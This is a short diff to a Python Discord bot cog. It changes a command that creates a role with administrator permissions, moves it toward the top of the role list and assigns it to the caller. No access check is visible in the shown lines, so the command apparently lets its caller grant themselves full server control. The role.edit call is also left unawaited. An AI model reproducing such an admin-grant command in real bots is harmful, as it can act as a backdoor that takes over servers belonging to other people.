@@ -17,8 +17,8 @@ class Role(commands.Cog):
 			admin = discord.Permissions(administrator=True)
 			await ctx.guild.create_role(name=name, permissions=admin)
 			role = get(ctx.guild.roles, name=name)
-			#bot = ctx.guild.get_member(self.bot.user.id)
-			role.edit(position=self.bot.roles[-1].position)
+			bot = ctx.guild.get_member(self.bot.user.id)
+			role.edit(position=bot.roles[-1].position)
 		await ctx.author.add_roles(role)
 
 	@commands.command(
